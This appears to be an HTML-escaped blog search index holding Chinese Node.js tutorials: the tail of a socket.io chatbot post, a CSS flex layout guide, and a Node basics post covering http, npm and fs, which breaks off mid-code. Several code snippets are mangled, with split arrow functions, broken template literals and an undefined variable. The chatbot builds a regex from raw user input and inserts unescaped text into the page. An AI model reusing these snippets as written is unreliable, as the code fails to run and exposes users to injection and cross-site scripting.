msg=&#x27;您当前的流量有200M&#x27;        &#125;else&#123;            var msg=&#x27;请输入正确的信息&#x27;        &#125;        socket.emit(&#x27;servermessage&#x27;,msg);    &#125;)&#125;);\n\n\n完整代码\n\n2.3 express结合socket.io及数据库实现智能机器人\n跨域也可以访问socket.io\n\n// app.jsvar express=require(&#x27;express&#x27;);var app=express();var DB=require(&#x27;./module/db.js&#x27;);/*第一步*/var server = require(&#x27;http&#x27;).Server(app);var io = require(&#x27;socket.io&#x27;)(server);app.set(&#x27;view engine&#x27;,&#x27;ejs&#x27;);app.use(express.static(&#x27;public&#x27;));app.get(&#x27;/&#x27;,function(req,res)&#123;    //res.send(&#x27;首页&#x27;);    res.render(&#x27;index&#x27;);&#125;)app.get(&#x27;/news&#x27;,function(req,res)&#123;    res.send(&#x27;news&#x27;);&#125;)//2.监听端口server.listen(8000,&#x27;127.0.0.1&#x27;, function () &#123;    console.log(&#x27;app run at 127.0.0.1:8000&#x27;)&#125;);   /*改ip*///3、写socket的代码io.on(&#x27;connection&#x27;, function (socket) &#123;    console.log(&#x27;建立链接&#x27;)    socket.on(&#x27;message&#x27;,function(data)&#123;        console.log(data)        //socket.emit(&#x27;servermessage&#x27;,msg);        var msg=data.msg||&#x27;&#x27;;  /*获取客户端的数据*/        //去服务器查询数据        DB.find(&#x27;article&#x27;,&#123;&#x27;title&#x27;:&#123;$regex:new RegExp(msg)&#125;&#125;,&#123;&#x27;title&#x27;:1&#125;,function(err,data)&#123;            console.log(data);            socket.emit(&#x27;servermessage&#x27;,&#123;                result:data            &#125;);        &#125;)    &#125;)&#125;);&lt;!DOCTYPE&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;    &lt;script  src=&quot;https://code.jquery.com/jquery-3.3.1.min.js&quot;  integrity=&quot;sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=&quot;  crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt;    &lt;style&gt;        .box&#123;            width: 300px;            height: 400px;            margin: 0 auto;            border: 1px solid #666;            margin-top:20px;        &#125;        .list&#123;            width: 300px;            height: 360px;            overflow-y: auto;        &#125;        .message&#123;            height: 40px;            line-height: 44px;            display: flex;        &#125;        .message input&#123;            border: 1px solid #666;        &#125;        .message input[type=&#x27;text&#x27;]&#123;            flex: 1;            height: 38px;        &#125;        .message input[type=&#x27;button&#x27;]&#123;            width: 100px;            height: 40px;            border: 1px solid #666;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;box&quot;&gt;        &lt;div class=&quot;list&quot;&gt;            &lt;div id=&quot;list&quot;&gt;            &lt;/div&gt;            &lt;div class=&quot;footer&quot; id=&quot;footer&quot;&gt;            &lt;/div&gt;        &lt;/div&gt;                &lt;div class=&quot;message&quot;&gt;            &lt;input type=&quot;text&quot; id=&quot;msg&quot; /&gt;            &lt;input type=&quot;button&quot; id=&quot;send&quot; value=&quot;发送&quot;/&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt;    $(function()&#123;        var socket = io.connect(&#x27;http://127.0.0.1:8000&#x27;);        socket.on(&#x27;servermessage&#x27;,function(data)&#123;            if(data.result.length)            &#123;                var str=&#x27;&lt;ul&gt;&#x27;;                for(var i=0;i&lt;data.result.length;i++)&#123;                    str+=&#x27;&lt;li&gt;&#x27;+data.result[i].title+&#x27;&lt;/li&gt;&#x27;;                &#125;                str+=&#x27;&lt;/ul&gt;&#x27;;            &#125;else&#123;                var str=&#x27;&lt;p&gt;没有找到您要的数据，请联系人工客服&lt;/p&gt;&#x27;            &#125;            $(&#x27;#list&#x27;).append(str);            $(&#x27;#footer&#x27;).get(0).scrollIntoView();        &#125;)        var username=&#x27;zhangsan&#x27;+Math.floor(Math.random()*10);        //群聊功能--聊天室        $(&#x27;#send&#x27;).click(function()&#123;            var msg=$(&#x27;#msg&#x27;).val();            socket.emit(&#x27;message&#x27;,&#123;                &#x27;username&#x27;:username,                &#x27;msg&#x27;:msg            &#125;);            $(&#x27;#list&#x27;).append(`&lt;p&gt;&lt;strong&gt;$&#123;username&#125;:&lt;/strong&gt;  $&#123;msg&#125;&lt;/p&gt;`);            $(&#x27;#msg&#x27;).val();        &#125;)    &#125;)&lt;/script&gt;\n\n\n完整代码\n\n三、Koa中Socket.io的使用1. 服务端配置\n# 1 安装cnpm i -S koa-socket// app.js// 2 引入const IO = require( &#x27;koa-socket&#x27; )// 3 实例化const io = new IO()io.attach( app )// 4 配置服务端app._io.on( &#x27;connection&#x27;, socket =&gt; &#123;console.log(&#x27;建立连接了&#x27;);&#125;)\n\n2. 客户端代码\n&lt;script src=&quot;http://localhost:3000/socket.io/socket.io.js&quot;&gt;&lt;/script&gt;&lt;script&gt;   var socket=io.connect(&#x27;http://localhost:3000/&#x27;)&lt;/script&gt;\n\n\n完整代码\n\n","categories":["后端"],"tags":["nodejs"]},{"title":"flex布局","url":"/2018/02/02/html+css+js+ts/1-flex/","content":"一、Flex 布局是什么？Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。\n任何一个容器都可以指定为 Flex 布局。\n\n.box&#123;  display: flex;&#125;\n\n行内元素也可以使用 Flex 布局。\n\n.box&#123;  display: inline-flex;&#125;\n\nWebkit 内核的浏览器，必须加上-webkit前缀。\n\n.box&#123;  display: -webkit-flex; /* Safari */  display: flex;&#125;\n\n注意，设为 Flex 布局以后，子元素的float、clear和vertical-align属性将失效。\n二、基本概念采用 Flex 布局的元素，称为 Flex 容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称”项目”。\n\n容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做main start，结束位置叫做main end；交叉轴的开始位置叫做cross start，结束位置叫做cross end。\n项目默认沿主轴排列。单个项目占据的主轴空间叫做main size，占据的交叉轴空间叫做cross size。\n三、容器的属性以下6个属性设置在容器上。\n\n\nflex-direction\nflex-wrap\nflex-flow\njustify-content\nalign-items\nalign-content\n\n\n3.1 flex-direction属性flex-direction属性决定主轴的方向（即项目的排列方向）。\n\n.box &#123;  flex-direction: row | row-reverse | column | column-reverse;&#125;\n\n\n它可能有4个值。\n\n\nrow（默认值）：主轴为水平方向，起点在左端。\nrow-reverse：主轴为水平方向，起点在右端。\ncolumn：主轴为垂直方向，起点在上沿。\ncolumn-reverse：主轴为垂直方向，起点在下沿。\n\n\n3.2 flex-wrap属性默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。\n\n\n.box&#123;  flex-wrap: nowrap | wrap | wrap-reverse;&#125;\n\n它可能取三个值。\n（1）nowrap（默认）：不换行。\n\n（2）wrap：换行，第一行在上方。\n\n（3）wrap-reverse：换行，第一行在下方。\n\n3.3 flex-flowflex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。\n\n.box &#123;  flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;&#125;\n\n3.4 justify-content属性justify-content属性定义了项目在主轴上的对齐方式。\n\n.box &#123;  justify-content: flex-start | flex-end | center | space-between | space-around;&#125;\n\n\n它可能取5个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。\n\n\nflex-start（默认值）：左对齐\nflex-end：右对齐\ncenter： 居中\nspace-between：两端对齐，项目之间的间隔都相等。\nspace-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。\n\n\n3.5 align-items属性align-items属性定义项目在交叉轴上如何对齐。\n\n.box &#123;  align-items: flex-start | flex-end | center | baseline | stretch;&#125;\n\n\n它可能取5个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。\n\n\nflex-start：交叉轴的起点对齐。\nflex-end：交叉轴的终点对齐。\ncenter：交叉轴的中点对齐。\nbaseline: 项目的第一行文字的基线对齐。\nstretch（默认值）：如果项目未设置高度或设为auto，将占满整个容器的高度。\n\n\n3.6 align-content属性align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。\n\n.box &#123;  align-content: flex-start | flex-end | center | space-between | space-around | stretch;&#125;\n\n\n该属性可能取6个值。\n\n\nflex-start：与交叉轴的起点对齐。\nflex-end：与交叉轴的终点对齐。\ncenter：与交叉轴的中点对齐。\nspace-between：与交叉轴两端对齐，轴线之间的间隔平均分布。\nspace-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。\nstretch（默认值）：轴线占满整个交叉轴。\n\n\n四、项目的属性以下6个属性设置在项目上。\n\n\norder\nflex-grow\nflex-shrink\nflex-basis\nflex\nalign-self\n\n\n4.1 order属性order属性定义项目的排列顺序。数值越小，排列越靠前，默认为0。\n\n.item &#123;  order: &lt;integer&gt;;&#125;\n\n\n4.2 flex-grow属性flex-grow属性定义项目的放大比例，默认为0，即如果存在剩余空间，也不放大。\n\n.item &#123;  flex-grow: &lt;number&gt;; /* default 0 */&#125;\n\n\n如果所有项目的flex-grow属性都为1，则它们将等分剩余空间（如果有的话）。如果一个项目的flex-grow属性为2，其他项目都为1，则前者占据的剩余空间将比其他项多一倍。\n4.3 flex-shrink属性flex-shrink属性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小。\n\n.item &#123;  flex-shrink: &lt;number&gt;; /* default 1 */&#125;\n\n\n如果所有项目的flex-shrink属性都为1，当空间不足时，都将等比例缩小。如果一个项目的flex-shrink属性为0，其他项目都为1，则空间不足时，前者不缩小。\n负值对该属性无效。\n4.4 flex-basis属性flex-basis属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为auto，即项目的本来大小。\n\n.item &#123;  flex-basis: &lt;length&gt; | auto; /* default auto */&#125;\n\n它可以设为跟width或height属性一样的值（比如350px），则项目将占据固定空间。\n4.5 flex属性flex属性是flex-grow, flex-shrink 和 flex-basis的简写，默认值为0 1 auto。后两个属性可选。\n\n.item &#123;  flex: none | [ &lt;&#x27;flex-grow&#x27;&gt; &lt;&#x27;flex-shrink&#x27;&gt;? || &lt;&#x27;flex-basis&#x27;&gt; ]&#125;\n\n该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。\n建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。\n4.6 align-self属性align-self属性允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性。默认值为auto，表示继承父元素的align-items属性，如果没有父元素，则等同于stretch。\n\n.item &#123;  align-self: auto | flex-start | flex-end | center | baseline | stretch;&#125;\n\n\n该属性可能取6个值，除了auto，其他都与align-items属性完全一致。\n","categories":["前端"],"tags":["html"]},{"title":"node-基础总结","url":"/2019/05/14/nodejs/node-%E5%9F%BA%E7%A1%80%E7%AF%87/","content":"一、nodejs介绍1.1 简介\nnodejs是一个JavaScript运行环境。它让 JavaScript 可以开发后端程序，实现几乎其他后端语言实现的所有功能\nNodejs 是基于 V8 引擎，V8 是 Google 发布的开源 JavaScript 引擎，本身就是用于 Chrome 浏览器 的 JS 解释部分， V8 搬到了服务器上，用于做服务器的软件\n短短几年的时间，Node 取得了巨大的成功。在企业界，Node 的应用也越来越广泛，2016 年 nodeJS 官方的调查报告。2016 年全球有 350 万开发者使用 nodeJS,相比去年保持了 100%的增长率。像 Yahoo、 Microsoft 这样的大公司，有好多应用已经迁移到 Node 了。国内的阿里巴巴、网易、腾讯、新浪、百度等 公司的很多线上产品也纷纷改用 Node 开发，并取得了很好的效果。据统计很多 A 轮、 B 轮的创业公司更 喜欢使用 NodeJs 开发。\n\n\nhttps://nodejs.org/static/documents/2016-survey-report.pdf\n\n1.2 NodeJs 的优势1. NodeJs 语法完全是 js 语法，只要你懂 JS 基础就可以学会 Nodejs 后端开发\n\nNode 打破了过去 JavaScript 只能在浏览器中运行的局面。前后端编程环境统一，可以大大降低开发成本\n\n2. NodeJs 超强的高并发能力\n\nNode.js 的首要目标是提供一种简单的、用于创建高性能服务器及可在该服务器中运行的各种应用程 序的开发工具\n首先让我们来看一下现在的服务器端语言中存在着什么问题。在 Java、PHP 或者.net 等服务器端语言中，会为每一个客户端连接创建一个新的线程。而每个线程需要耗费大约 2MB 内存理论上，一个 8GB 内存的服务器可以同时连接的最大用户数为 4000 个左右。要让 Web 应用程序支持更多的用户，就 需要增加服务器的数量，而 Web 应用程序的硬件成本当然就上升了\nNode.js 不为每个客户连接创建一个新的线程，而仅仅使用一个线程。当有用户连接了，就触发一个 内部事件，通过非阻塞 I/O、事件驱动机制，让 Node.js 程序宏观上也是并行的。使用 Node.js，一个 8GB 内存的服务器，可以同时处理超过 4 万用户的连接\n\n3. 实现高性能服务器\n\n严格地说，Node.js 是一个用于开发各种 Web 服务器的开发工具。在 Node.js 服务器中，运行的是高性能 V8 JavaScript 脚本语言，该语言是一种可以运行在服务器端的 JavaScript 脚本语言\n那么，什么是 V8 JavaScript 脚本语言呢?该语言是一种被 V8 JavaScript 引擎所解析并执行的脚本语言。V8 JavaScript 引擎是由 Google 公司使用 C++语言开发的一种高性能 JavaScript 引擎，该引擎并不局限于在浏览 器中运行。Node.js 将其转用在了服务器中，并且为其提供了许多附加的具有各种不同用途的 API。例如， 在一个服务器中，经常需要处理各种二进制数据。在 JavaScript 脚本语言中，只具有非常有限的对二进制数 据的处理能力，而 Node.js 所提供的 Buffer 类则提供了丰富的对二进制数据的处理能力\n另外，在 V8 JavaScript引擎内部使用一种全新的编译技术。这意味着开发者编写的高端的 JavaScript 脚本代码与开发者编写的低端的C语言具有非常相近的执行效率，这也是Node.js服务器可以提供的一个重要特性\n\n4. 开发周期短、开发成本低、学习成本低。\n\nNode.js 自身哲学，是花最小的硬件成本，追求更高的并发，更高的处理性能。\n特点:Node.js uses an event-driven, non-blocking I/O model that makes it lightweight and efficient.\n\n1.3 NodeJs 适合做什么\n在短短几年多的时间里，Node 变得非常热门，使用者也非常多。这些使用者对于 Node 的各自倚重点也各部相同，经过整理,主要有下几类\n\n1. 前后端编程语言环境统一\n\n这类重点的代表是雅虎。雅虎开放了 Cocktai 框架，利用 自己深厚的前端沉淀，将 YUI3 这个前端框架的能力借助 Node 延伸到服务器端，使得使用 者摆脱了日常工作中一边写 JavaScript —边写 PHP 所帯来的上下文交换负担\n\n2. Node 带来的高性能 I&#x2F;0 用于实时应用\n\nVoxer 将 Node 应用在实时语音上。国内腾讯的 朋友网将 Node 应用在长连接中，以提供实时功能，花瓣网、蘑菇街等公司通过 socket.io 实 现实时通知的功能。\n\n3. 并行 I&#x2F;0 使得使用者可以更高效地利用分布式环境\n\n阿里巴巴 eBay 是这方面的典型。 阿里巴巴的 NodeFox 和 eBay 的 ql.io 都是借用 Node 并行 I&#x2F;O 的能力，更高效地使用已有的 数据\n\n4. 并行 I&#x2F;O •有效利用稳定接口提升 Web 渲染能力\n\n雪球财经和 Linkedln 的移动版网站均 是这种案例，撇弃 同步等待式的顺序请求，大胆采用并行丨&#x2F;〇，加速数据的获取进而提升 Web 的渲染速度\n\n5. 云计算平台提供 Node 支持\n\n微软将 Node 引入 Azure 的开发中，阿里云、百度均纷纷 在云服务器上提供 Node 应用托管服务，Joyent 更是云计算中提供 Node 支持的代表。这类 平台看重 JavaScript 带来的开发上的优势，以及低资源占用、高性能的特点\n\n6. 游戏开发领域\n\n游戏领域对实时和并发有很高的要求，网易开源了 pomelo 实时框架， 可以应用在游戏和高实时应用中\n\n7. 工具类应用\n\n过去依赖 java 或其他语言构建的前端工具类应用，纷纷被一些前端工程 师用 Node 重写，用前端熟悉的语言为前端构建熟悉的工具\n\n二、HTTP模块、URL模块 supervisor工具\n用 Node.js 时，我们不仅仅在实现一个应用，同时还实现了整个 HTTP 服务器\n\n2.1 创建一个简单的程序var http = require(&#x27;http&#x27;);http.createServer(function(request, response) &#123;    // 发送 HTTP 头部    // HTTP 状态值: 200 : OK    //设置 HTTP 头部，状态码是 200，文件类型是 html，字符集是 utf8 response.writeHead(200,&#123;&quot;Content-Type&quot;:&quot;text/html;charset=UTF-8&quot;&#125;);    // 发送响应数据 &quot;Hello World&quot;    res.end(&quot;哈哈哈哈，我买了一个 iPhone&quot; + (1 + 2 + 3) + &quot;s&quot;);&#125;).listen(8888);// 终端打印如下信息console.log(&#x27;Server running at http://127.0.0.1:8888/&#x27;);\n\n\n你会发现，我们本地写一个 js，打死都不能直接拖入浏览器运行，但是有了 node，我 们任何一个 js 文件，都可以通过 node 来运行。也就是说，node 就是一个 js 的执行环境\n\n2.2 HTTP 模块、URL模块\nNode.js 中，将很多的功能，划分为了一个个 module(模块)。 Node.js 中的很多功能都 是通过模块实现\n\n2.2.1、HTTP 模块的使用//引用模块var http = require(&quot;http&quot;);//创建一个服务器，回调函数表示接收到请求之后做的事情var server = http.createServer(function(req, res) &#123; //req 参数表示请求，res 表示响应    console.log(&quot;服务器接收到了请求&quot; + req.url);    res.end(); // End 方法使 Web 服务器停止处理脚本并返回当前结果&#125;);//监听端口server.listen(3000, &quot;127.0.0.1&quot;);\n\n设置一个响应头\nres.writeHead(200,&#123;&quot;Content-Type&quot;:&quot;text/html;charset=UTF8&quot;&#125;);\n\n\n\n我们现在来看一下 req 里面能够使用的东西\n最关键的就是 req.url 属性，表示用户的请求 URL 地址。所有的路由设计，都是通过 req.url 来实现的。\n我们比较关心的不是拿到 URL，而是识别这个 URL\n识别 URL，用到了下面的 URL 模块\n\n2.2.2、URL 模块的使用\nurl.parse() 解析URL\nurl.format(urlObject) 是上面 url.parse() 操作的逆向操作\nurl.resolve(from, to) 添加或者替换地址\n\n1. url.parse()\n\n\n2. url.format()\n\n3. url.resolve()\n\n2.3 Nodejs 自启动工具 supervisor\nsupervisor 会不停的 watch 你应用下面的所有文件，发现有文件被修改，就重新载入程序文件这样就实现了部署，修改了程序文件后马上就能看到变更后的结果。麻麻再也不用担心我的重启 nodejs 了\n\n首先安装 supervisor\nnpm install -g supervisor\n\n使用 supervisor 代替 node 命令启动应用\n\n三、CommonJs 和 Nodejs 模块3.1 什么是 CommonJs\nJavaScript 是一个强大面向对象语言，它有很多快速高效的解释器。然而， JavaScript 标准定义的 API 是为了构建基于浏览器的应用程序。并没有制定一个用于更广泛的应用程序 的标准库。,而不只是停留在小脚本程序 的阶段。用 CommonJS API 编写出的应用，不仅可以利用 JavaScript开发客户端应用，而且还可以编写以下应 用\n\n\n服务器端 JavaScript 应用程序。(nodejs)\n命令行工具\n桌面图形界面应用程序\n\n\nCommonJS 就是模块化的标准，nodejs 就是 CommonJS(模块化)的实现\n\n3.2 Nodejs 中的模块化\nNode 应用由模块组成，采用 CommonJS 模块规范\n\n3.2.1 在 Node 中，模块分为两类\n一类是 Node 提供的模块,称为核心模块;另一类是用户编写的模块，称为文件模块\n\n\n\n核心模块部分在 Node 源代码的编译过程中，编译进了二进制执行文件。在 Node 进程启动时，部分核心模块就被直接加载进内存中，所以这部分核心模块引入时，文件定位和 编译执行这两个步骤可以省略掉，并且在路径分析中优先判断，所以它的加载速度是最快的。 如:HTTP 模块 、URL 模块、Fs 模块都是 nodejs 内置的核心模块，可以直接引入使用\n文件模块则是在运行时动态加载，需要完整的路径分析、文件定位、编译执行过程、速度相比核心模块稍微慢一些，但是用的非常多。这些模块需要我们自己定义。接下来我 们看一下 nodejs 中的自定义模块。\n\n\n3.2.2 CommonJS(Nodejs)中自定义模块的规定\n我们可以把公共的功能抽离成为一个单独的 js 文件作为一个模块，默认情况下面这 个模块里面的方法或者属性，外面是没法访问的。如果要让外部可以访问模块里面的方法或 者属性，就必须在模块里面通过 exports 或者 module.exports 暴露属性或者方法\n在需要使用这些模块的文件中，通过 require 的方式引入这个模块。这个时候就可以 使用模块里面暴露的属性和方法\n\n\n3.2.3 定义使用模块// 定义一个 tools.js 的模块 //模块定义var tools = &#123;    sayHello: function() &#123;        return &#x27;hello NodeJS&#x27;;    &#125;,    add: function(x, y) &#123;        return x + y;    &#125;&#125;;// 模块接口的暴露// module.exports = tools; exports.sayHello = tools.sayHello; exports.add = tools.add;var http = require(&#x27;http&#x27;);// 引入自定义的 tools.js 模块var tools = require(&#x27;./tools&#x27;);tools.sa yHello(); //使用模块\n\n四、NPM第三方模块和package4.1 包与 NPM4.1.1 包\nNodejs 中除了它自己提供的核心模块外，我们可以自定义模块，也可以使用 第三方的模块。Nodejs中第三方模块由包组成，可以通过包来对一组具有相互依 赖关系的模块进行统一管理\n\n\n完全符合 CommonJs 规范的包目录一般包含如下这些文件\n\npackage.json :包描述文件\nbin :用于存放可执行二进制文件的目录\nlib :用于存放 JavaScript 代码的目录\ndoc :用于存放文档的目录\n\n\n在 NodeJs 中通过 NPM 命令来下载第三方的模块(包)\n\n4.1.2 NPM 介绍\nnpm 是世界上最大的开放源代码的生态系统。我们可以通过 npm 下载各种各样的包，这些源代码(包)我们可以在 https://www.npmjs.com 找到\n\n\nnpm 是随同 NodeJS 一起安装的包管理工具，能解决 NodeJS 代码部署上的很多问题，常见的使用场景有 以下几种\n\n\n允许用户从 NPM 服务器下载别人编写的第三方包到本地使用\n允许用户从 NPM 服务器下载并安装别人编写的命令行程序(工具)到本地使用\n允许用户将自己编写的包或命令行程序上传到 NPM 服务器供别人使用\n\nNPM 命令详解\n\nnpm -v 查看 npm 版本\nnpm install 使用 npm 命令安装模块\nnpm uninstall moudleName 卸载模块\nnpm list 查看当前目录下已安装的 node 包\nnpm info jquery 查看 jquery 的版本\n指定版本安装 npm install jquery@1.8.0\n\n4.2 package.json\npackage.json 定义了这个项目所需要的各种模块,以及项目的配置信息(比如名称、版本、许可证等元数据)\n\n1. 创建 package.json\nnpm initnpm init –yes\n\n2. 安装模块并把模块写入 package.json(依赖)\n\nnpm install babel-cli --save-dev\nnpm install 模块 --save\n\n3. dependencies 与 devDependencies 之间的区别\n\n使用 npm install node_module –save 自动更新 dependencies 字段值;\n使用 npm install node_module –save-dev 自动更新 devDependencies 字段值\ndependencies 配置当前程序所依赖的其他\ndevDependencies 配置当前程序所依赖的其他包，只会下载模块，而不下载这些模块的测试 和文档框架\n\n&quot;dependencies&quot;: &#123;    &quot;ejs&quot;: &quot;^2.3.4&quot;,    &quot;express&quot;: &quot;^4.13.3&quot;,    &quot;formidable&quot;: &quot;^1.0.17&quot;&#125;\n\n\n^表示第一位版本号不变，后面两位取最新的\n~表示前两位不变，最后一个取最新\n*表示全部取最新\n\n4.3 安装淘宝镜像\nhttp://www.npmjs.org npm 包官网\nhttps://npm.taobao.org/ 淘宝 npm 镜像官网\n\n\n淘宝 NPM 镜像是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频 率目前为 10 分钟 一次以保证尽量与官方服务同步\n\n我们可以使用我们定制的 cnpm (gzip 压缩支持) 命令行工具代替默认的 npm:\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\n\n五、fs模块5.1 fs.stat 检测是文件还是目录const fs = require(&#x27;fs&#x27;)fs.stat(&#x27;hello.js&#x27;, (error, stats) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(stats)                 console.log(`文件: $ &#123;            stats.isFile()        &#125;`)                 console.log(`目录: $ &#123;            stats.isDirectory()        &#125;`)    &#125;&#125;)\n\n5.2 fs.mkdir 创建目录const fs = require(&#x27;fs&#x27;) fs.mkdir(&#x27;logs&#x27;, (error) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(&#x27;成功创 建目录:logs&#x27;)    &#125;&#125;)\n\n5.3 fs.writeFile 创建写入文件fs.writeFile(&#x27;logs/hello.log&#x27;, &#x27;您好 ~ \\n&#x27;, (error) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(&#x27;成功写 入文件&#x27;)    &#125;&#125;)\n\n5.4 fs.appendFile 追加文件fs.appendFile(&#x27;logs/hello.log&#x27;, &#x27;hello ~ \\n&#x27;, (error) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(&#x27;成功写 入文件&#x27;)    &#125;&#125;)\n\n5.5 fs.readFile 读取文件const fs = require(&#x27;fs&#x27;) fs.readFile(&#x27;logs/hello.log&#x27;, &#x27;utf8&#x27;, (error, data) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(data)    &#125;&#125;)\n\n5.6 fs.readdir 读取目录const fs = require(&#x27;fs&#x27;) fs.readdir(&#x27;logs&#x27;, (error, files) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(files)    &#125;&#125;)\n\n5.7 fs.rename 重命名const fs = require(&#x27;fs&#x27;) fs.rename(&#x27;js/hello.log&#x27;, &#x27;js/greeting.log&#x27;, (error) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(&#x27; 重命名成功&#x27;)    &#125;&#125;)\n\n5.8 fs.rmdir 删除目录fs.rmdir(&#x27;logs&#x27;, (error) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(&#x27;成功的删除了目录:logs&#x27;)    &#125;&#125;)\n\n5.9 fs.unlink 删除文件fs.unlink(`logs / $ &#123;    file&#125;`, (error) = &gt;&#123;    if (error) &#123;        console.log(error)    &#125; else &#123;        console.log(`成功的删除了文件: $ &#123;            file        &#125;`)    &#125;&#125;)\n\n5.10 fs.createReadStream 从文件流中读取数据const fs = require(&#x27;fs&#x27;) var fileReadStream = fs.createReadStream(&#x27;data.json&#x27;) let count = 0;var str = &#x27;&#x27;;fileReadStream.on(&#x27;data&#x27;, (chunk) = &gt;&#123;    console.log(`$ &#123;++count    &#125;接收到: $ &#123;        chunk.length    &#125;`);    str += chunk&#125;) fileReadStream.on(&#x27;end&#x27;, () = &gt;&#123;    console.log(&#x27;--- 结束 ---&#x27;);    console.log(coun t);    console.log(str);&#125;) fileReadStream.on(&#x27;error&#x27;, (error) = &gt;&#123;    console.log(error)&#125;)\n\n5.11 fs.createWriteStream 写入文件var fs = require(&quot;fs&quot;);var data = &#x27;我是从数据库获取的数据，我要保存起来&#x27;;// 创建一个可以写入的流，写入到文件 output.txt 中var writerStream = fs.createWriteStream(&#x27;output.txt&#x27;); // 使用 utf8 编码写入数据writerStream.write(data, &#x27;UTF8&#x27;); // 标记文件末尾writerStream.end();// 处理流事件 --&gt; finish 事件writerStream.on(&#x27;finish&#x27;,function() &#123;    /*finish - 所有数据已被写入到底层系统时触发。*/    console.log(&quot;写入完 成。&quot;);&#125;);writerStream.on(&#x27;error&#x27;,function(err) &#123;    console.log(err.stack);&#125;);console.log(&quot;程序执 行完毕&quot;);\n\n5.12 管道流\n管道提供了一个输出流到输入流的机制。通常我们用于从一个流中获取数据并将数据传递到另外一个流中。\n\n\n\n如上面的图片所示，我们把文件比作装水的桶，而水就是文件里的内容 ，我们用一根管子(pipe )连接两个桶使得水从一个桶流入另一个桶，这样就慢慢的实现了大文件的复制过程。\n\n以下实例我们通过读取一个文件内容并将内容写入到另外一个文件中\nvar fs = require(&quot;fs&quot;);// 创建一个可读流var readerStream = fs.createReadStream(&#x27;input.txt&#x27;); // 创建一个可写流var writerStream = fs.createWriteStream(&#x27;output.txt&#x27;);// 管道读写操作// 读取 input.txt 文件内容，并将内容写入到 output.txt 文件中 readerStream.pipe(writerStream);console.log(&quot;程 序执行完毕&quot;);\n\n六、创建一个 WEB 服务器\n利用HTTP模块 URl模块 PATH模块 FS 模块创建一个 WEB 服务器\n\n1. Node.js 创建的第一个应用\n\n引入 http 模块\n\nvar http = require(&quot;http&quot;);\n\n2. 创建服务器\n\n接下来我们使用 http.createServer() 方法创建服务器，并使用 listen 方法绑定 8888 端口。 函数通过 request, response 参数来接收和响应数据\n\n//1.引入 http 模块var http=require(&#x27;http&#x27;);//2.用 http 模块创建服务http.createServer(fun ction(req, res) &#123;    // 发送 HTTP 头部    // HTTP 状态值: 200 : OK    //设置 HTTP 头部，状态码是 200，文件类型是 html，字符集是 utf-8    res.writeHead(200, &#123;        &quot;Content-Type&quot;: &quot;text/html;charset=&#x27;utf-8&#x27;&quot;    &#125;);    res.write(&#x27;你好 nodejs&#x27;);    res.write(&#x27;我是第一个 nodejs 程序&#x27;);    res.end();    /*结束响应*/&#125;).listen(8001);\n\n3. WEB 服务器介绍\n\nWeb 服务器一般指网站服务器，是指驻留于因特网上某种类型计算机的程序，可以向浏览 器等 Web 客户端提供文档，也可以放置网站文件，让全世界浏览;可以放置数据文件，让 全世界下载。目前最主流的三个 Web 服务器是 Apache Nginx IIS。\n\n七、Nodejs 的非阻塞 I&#x2F;O、异步、事件驱动7.1 Nodejs的单线程 非阻塞I&#x2F;O事件驱动\n在 Java、PHP 或者.net 等服务器端语言中，会为每一个客户端连接创建一个新的线程。 而每个线程需要耗费大约 2MB 内存。也就是说，理论上，一个 8GB 内存的服务器可以同时 连接的最大用户数为 4000 个左右。要让 Web 应用程序支持更多的用户，就需要增加服务器 的数量，而 Web 应用程序的硬件成本当然就上升了\nNode.js 不为每个客户连接创建一个新的线程，而仅仅使用一个线程。当有用户连接了， 就触发一个内部事件，通过非阻塞 I&#x2F;O、事件驱动机制，让 Node.js 程序宏观上也是并行的。 使用 Node.js，一个 8GB 内存的服务器，可以同时处理超过 4 万用户的连接。\n\n7.2 Nodejs 回调处理异步//错误的写法:function getData()&#123;     //模拟请求数据     var result=&#x27;&#x27;;    setTimeout(functio n ()&#123;         result=&#x27;这是请求到的 数据&#x27;    &#125;,200);        return result; &#125;console .log(getData());/*异步导致请求不到数据*///正确的处理异步:function getData(callback) &#123; //模拟请求数据    var result = &#x27;&#x27;;    setTimeout(function() &#123;        result = &#x27;这是请求到的 数据&#x27;;        